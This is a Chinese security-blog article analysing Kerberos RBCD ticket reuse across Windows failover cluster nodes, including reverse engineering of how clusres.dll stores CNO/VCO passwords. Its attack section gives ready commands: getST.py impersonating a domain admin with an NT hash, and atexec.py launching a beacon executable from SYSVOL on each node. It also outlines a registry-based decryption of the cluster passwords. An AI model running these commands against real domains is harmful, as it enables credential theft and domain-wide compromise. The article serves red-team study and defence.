---
title: CNO/VCO 集群票据复用场景分析
url: https://xz.aliyun.com/news/93351
source: 先知安全技术社区
date: 2026-11-16
fetch_date: 2026-11-17T09:50:20.862917
---

# CNO/VCO 集群票据复用场景分析

[先知社区](/)[文章](/news)[视频](/course)[众测](/vuln)[赛事](/ctf)[技能](/skills)[墨白](/mobai)[活动](/events)[名人堂](/hof)[积分商城](/points-mall)

[写文章](/write)

有用收藏打赏分享

# CNO/VCO 集群票据复用场景分析

[![](/images/default-avatar.png)闲\*人](/users/114143)·2026-11-17 00:25·11 分钟·24·广东·渗透测试

本文分析WSFC集群中利用单张RBCD票据横向控制多节点的攻击，通过逆向clusres.dll揭示CNO/VCO凭据全节点同步机制，攻陷单节点即可暴露整个集群信任关系。

# 前言

近期在看团队成员的红队复盘文件，属于集群环境下一个 RBCD ST 打多个机子的场景。文章从实际场景构建，到分析集群数据库、`clusres.dll`、加密检查点、`ResourceData` ，来解析这种情况。

一张 ST 打多台的根源是：票据绑定的是账户密钥，而非机器。RBCD 环境下拿到的 ST，其外层 `sname` 是某个 SPN，加密部分则用该 SPN 所属账户的长时密钥。只要多台主机持有同一把密钥，同一张票就都能解开。

# 常规情况

在常规域里，每台机器都有自己的机器账户（`SRV01$`、`SRV02$`），密钥也各不相同。你在 SRV01 上做 RBCD 并拿到 `cifs/srv01` 的 ST 后，将它用于 SRV02 时，SRV02 的 LSA 用自己那把密钥解密，必然失败，所以直接返回 `KRB_AP_ERR_MODIFIED`。

一个 RBCD ST 打多个机子真正成立的场景：
（1）共享服务账户、gMSA
（2）机器账户凭据被复制
（3）集群、AlwaysOn 虚拟名（CNO 或 VCO）

# 概念：CNO、VCO、MSSQL 集群

1、集群在 AD 里有两个身份：
`CNO`（Cluster Name Object） 代表集群的管理名称。是 WSFC 集群本身的身份，用来创建、管理所有 VCO。
`VCO` （Virtual Computer Object）代表集群的客户端访问点。是每个角色（例如文件服务、MSSQL、ADFS）各有一个身份，每个身份都带一份密码，而这份密码会被复制到每一台节点上。
`WSFC 集群数据库` 保存 CNO/VCO 的机器账户凭据，集群会自动定期轮换 CNO、VCO 的 AD 计算机账户密码，并且同步到所有节点的 CLUSDB，所以每个节点都持有这份凭据副本。

2、MSSQL 集群有两种：
FCI（Failover Cluster Instances）实例级高可用，
AG（Always-On Availability Groups）单数据库级高可用。
FCI 和 AG 都依赖 `WSFC`，虚拟网络名称都使用 WSFC 的 `CNO/VCO` 模型。

# 01 环境部署

从典型的部署过程来理解 CNO、VCO。
（1）选集群的服务器
三台 winserver，装 Failover Clustering 功能，用 Failover Cluster Manager 部署集群，选择要加入集群的服务器：

![](https://xzfile.aliyuncs.com/2026/11/17/0001/e06467f8-f38.png)

（2）配管理集群的访问点
这一步会在 AD 里创建一个与集群同名的计算机对象 CNO

![](https://xzfile.aliyuncs.com/2026/11/17/0001/496d23bf-b84.png)![](https://xzfile.aliyuncs.com/2026/11/17/0001/c3b40731-9ee.png)

（3）集群建好后，再装高可用角色。

![](https://xzfile.aliyuncs.com/2026/11/17/0002/33b7ab95-77e.png)

（4）选了 File Server 简化演示

![](https://xzfile.aliyuncs.com/2026/11/17/0002/cd35a520-c63.png)

（5）设访问点 VCO

![](https://xzfile.aliyuncs.com/2026/11/17/0002/251493c8-345.png)

（6）配置一个共享盘

![](https://xzfile.aliyuncs.com/2026/11/17/0002/f26d2612-05e.png)![](https://xzfile.aliyuncs.com/2026/11/17/0002/3205222f-9c2.png)![](https://xzfile.aliyuncs.com/2026/11/17/0002/f28b15f9-d59.png)

下图是 CNO 的默认 SPN 列表

![](https://xzfile.aliyuncs.com/2026/11/17/0002/f28b15f9-d59.png)

下图是 VCO 默认 SPN 列表，与 CNO 相比没有 `MSServerCluster` 这个服务类

![](https://xzfile.aliyuncs.com/2026/11/17/0003/ec3c480b-f69.png)

构造一种场景，即入口。让 DomainComputers 组对集群对象拥有 `WriteAccountRestrictions`权限，这样就可做 RBCD 控制一个有 SPN 的身份，替任意用户签票。

![](https://xzfile.aliyuncs.com/2026/11/17/0005/9230480a-466.png)

# 02 攻击过程

初始权限位于 DomainComputers 组，其对集群对象拥有 `WriteAccountRestrictions`权限

```
python3 getST.py 'ludus.domain/cluster-share$' -impersonate domainadmin -altservice 'HOST/CLUSTER-SHARE.LUDUS.DOMAIN' -hashes :a439642f7b710d11b75e152dd4e17431 -self

export KRB5CCNAME=domainadmin@HOST_CLUSTER-SHARE.LUDUS.DOMAIN@LUDUS.DOMAIN.ccache
```

![](https://xzfile.aliyuncs.com/2026/11/17/0005/9f820418-acd.png)

枚举发现存在三个节点，当前节点为 test-cluster3 这台机器

```
python3 wsfcHunter.py -target cluster-share.ludus.domain -k -no-pass
(Cmd) enum_cluster node
(Cmd) enum_cluster group
(Cmd) get_groupstate cluster-share
```

![](https://xzfile.aliyuncs.com/2026/11/17/0005/de9a0eb8-edb.png)

执行回连，成功上线。

```
python3 atexec.py @cluster-share.ludus.domain '\\test-dc01-2022.ludus.domain\SYSVOL\apollo_bhno.exe' -silentcommand -k -no-pass
```

![](https://xzfile.aliyuncs.com/2026/11/17/0006/aba2e249-575.png)![](https://xzfile.aliyuncs.com/2026/11/17/0009/b59c96fc-c5b.png)

wsfcHunter.py 切节点到 test-cluster2

```
(Cmd) movegroup -group cluster-share -node test-cluster2
```

![](https://xzfile.aliyuncs.com/2026/11/17/0006/bee88c6e-1c7.png)

执行回连，成功上线。

```
python3 atexec.py @cluster-share.ludus.domain '\\test-dc01-2022.ludus.domain\SYSVOL\apollo_bhno.exe' -silentcommand -k -no-pass
```

![](https://xzfile.aliyuncs.com/2026/11/17/0008/c452b536-99e.png)

wsfcHunter.py 切节点到 test-cluster，执行回连

```
movegroup -group cluster-share -node test-cluster

python3 atexec.py @cluster-share.ludus.domain '\\test-dc01-2022.ludus.domain\SYSVOL\apollo_bhno.exe' -silentcommand -k -no-pass
```

![](https://xzfile.aliyuncs.com/2026/11/17/0007/2916e218-c57.png)

结果：一个 ST 打一个集群。这个结果违反了常识：

# 03 票据的复用范围

一张票，凭什么在集群里每台节点上都成立？
dump 凭据，各节点哈希/密钥各不相同。不是共享密码。
检查 AD 里所有集群成员，没有任何委派配置。不是委派。

标准 AD 概念解释不了这个现象了，转折点在登录会话的发现。

## 3.1 特点：相同的登录会话

三台节点上都能看到 自身、CNO、VCO 三个身份的登录会话

![](https://xzfile.aliyuncs.com/2026/11/17/0009/0f947379-626.png)

第二台、第三台节点上同样存在 CNO 、 VCO 的登录会话：

![](https://xzfile.aliyuncs.com/2026/11/17/0010/90720bec-7ba.png)![](https://xzfile.aliyuncs.com/2026/11/17/0010/aa19d503-b28.png)

登录会话是"密码被真正使用过"的痕迹——如果 CNO 只是个逻辑身份，节点上没有它的会话，那密码可以从别处借；但三台节点都有，就意味着密码在本地，而且每台都有一份。
线索来自一个修复功能

## 3.2 Repair 功能的三个注册表键

WSFC 密码存在集群数据库里，和密码相关的操作有 `Repair`，修复涉及到读旧密码和写新密码。这里用 Procmon 看 VCO 的 repair 过程中发生了什么，得到三个关键操作：

![](https://xzfile.aliyuncs.com/2026/11/17/0010/e84070f9-45c.png)

### （1）CryptoContainerGuid

首先查询 `HKLM\CLUSTER\ca462fe6e-51c0-47e1-93ce-1eff4dfd463e\CryptoContainerGuid`，返回一个 GUID。

![](https://xzfile.aliyuncs.com/2026/11/17/0010/c6dbf68e-c46.png)![](https://xzfile.aliyuncs.com/2026/11/17/0010/4f1375dc-b6e.png)

### （2）Checkpoints

下一次是查询 `HKLM\Cluster\Checkpoints\ca46...\Crypto\Checkpoints`，返回加密密码所用密钥的位置。该值遵循 MS-CMRP 规范；checkpoint 保证资源故障转移到别的节点时，密钥也跟着迁移。

![](https://xzfile.aliyuncs.com/2026/11/17/0010/87dde795-0c2.png)![](https://xzfile.aliyuncs.com/2026/11/17/0011/5de2a1fe-e92.png)

### （3）ResourceData 被重写

最后是写入 `HKLM\Cluster\Resources\ca46...\Parameters\ResourceData`。之后，`ResourceData` 这份配置也会被复制到其他节点上

![](https://xzfile.aliyuncs.com/2026/11/17/0012/c9bdfd78-c46.png)![](https://xzfile.aliyuncs.com/2026/11/17/0012/0e602746-ae9.png)

这就是"为什么每台都有"的机制解释：密码存在 `ResourceData`，密钥单独存在 checkpoint 里随资源走，配置通过 Paxos 复制到每一台节点。`ResourceData`的解密位于 `clusres.dll`

## 3.3 clusres.dll 相关解密代码

![](https://xzfile.aliyuncs.com/2026/11/17/0014/c59e3332-72b.png)![](https://xzfile.aliyuncs.com/2026/11/17/0015/52aca8c6-5fe.png)

## 3.4 写解密脚本

1、把这套算法解密部分拿出来，我就可以不依赖 `clusres.dll`，通过读取注册表，把集群存着的 CNO/VCO 账号密码解出来。思路是
（1）按 `HKLM\Cluster\Checkpoints` 列出所有 checkpoint 的 GUID
（2）对每个 GUID 读 `...\<guid>\Crypto` 的值 `Checkpoints`，得到 `providerType\provider\container` 三段
（3）读 `ResourceData` 拿到密文
（4）同时读同级的 `Name` 值确认账号后
（5）交给 `CryptProvider::Decrypt` 解密
（6）最后顺带把明文算成了 NT hash

2、用脚本解密 `ResourceData` 存储的密码，结果：
`Name` 值为 `Cluster Name$` (CNO)，密码被重置过，能拿到当前明文密码 + NT hash；旧槽只剩当前密码的残缺副本
`Name` 值为 `cluster-share$` (VCO)，能拿到当前明文密码 + NT hash；上一个密码 + hash（与当前相同）

![](https://xzfile.aliyuncs.com/2026/11/17/0015/c3c1c838-6f0.png)

WSFC 保留"当前密码 + 上一个密码"，是为了在 CNO/VCO 密码轮换时，用旧密码签发的票据仍能解密，避免 Kerberos 报错打断服务。这与 KRBTGT 账号（存最近两个密码）完全同构。

# 04 节点上共有的登录会话

[# Resource Monitor](https://link.wtturl.cn/?target=https%3A%2F%2Flearn.microsoft.com%2Fen-us%2Fprevious-versions%2Fwindows%2Fdesktop%2Fmscs%2Fresource-monitor&scene=im&aid=497858&lang=zh)
[# Introducing Microsoft Cluster Service (MSCS) in the Windows Server 2003 Family](https://link.wtturl.cn/?target=https%3A%2F%2Flearn.microsoft.com%2Fen-us%2Fprevious-versions%2Fwindows%2Fserver-2003%2Fms952401(v%3Dmsdn.10)&scene=im&aid=497858&lang=zh)

> 文档中提及：默认情况下，每个节点上的集群服务（Cluster service）会创建一个资源监视器 （Resource Monitor）。在创建资源时，可以请求单独的监视器来覆盖此默认行为。对于不稳定资源和调试新资源类型，建议使用独立监视器。
> Resource Monitor 是集群服务和集群资源之间的接口，以独立进程运行。集群服务通过 Resource Monitor 与资源 DLL 通信。单个节点上可以同时运行多个 Resource Monitor 实例。

所以，默认每个节点集群服务创建 1 个 Resource Monitor 进程，该进程可以承载多个集群资源；可以手动配置，为某个资源单独新建独立 Resource Monitor 进程。

## 4.1 clusres.dll Token 相关

1、`NetName::Identity::OnInitialize` 的调用关系

![](https://xzfile.aliyuncs.com/2026/11/17/0015/56b753ca-314.png)

2、ObtainNewToken 内部的调用序列
`ObtainNewToken` 负责真正的登录：先 `NNClusterCrypto::DecryptPassword` 解密，再 `NetNameLib::CredentialAccess::Logon` 登录。

![](https://xzfile.aliyuncs.com/2026/11/17/0015/b2362ca1-d0f.png)

3、最终由 NetNameLib::CredentialAccess::Logon 执行登录

![](https://xzfile.aliyuncs.com/2026/11/17/0015/2a2da2a9-231.png)

4、Token Viewer 可以确认 `rhs.exe` 同时持有两个身份的 token：

![](https://xzfile.aliyuncs.com/2026/11/17/0015/1bce74b6-f82.png)

所以：每台节点上都有一个"握着集群身份"的进程。本地管理员连数据库都不用解，直接偷 token 就行。...